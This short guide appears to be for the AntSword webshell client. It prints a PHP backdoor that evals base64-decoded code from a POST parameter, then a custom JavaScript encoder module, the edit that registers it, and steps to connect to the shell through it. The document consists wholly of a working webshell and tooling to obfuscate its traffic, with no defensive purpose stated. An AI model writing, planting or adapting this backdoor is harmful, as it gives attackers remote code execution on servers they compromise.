shell code
```php
<?php 
$a = $_POST['n985de9'];
if(isset($a)) {
    eval(base64_decode($a));
}
?>
```

add : source/core/php/encoder/mybase64.js

```js
module.exports = (pwd, data) => {
  data[pwd] = new Buffer(data['_']).toString('base64');
  delete data['_'];
  return data;
}
```

edit : sources/core/php/index.js < add some code: regedit mybase64.js

```js
  get encoders() {
    return ['chr', 'base64', 'mybase64'];
  }
```
restart antsword, and add shell, select mybase64 encode  for this shell code.

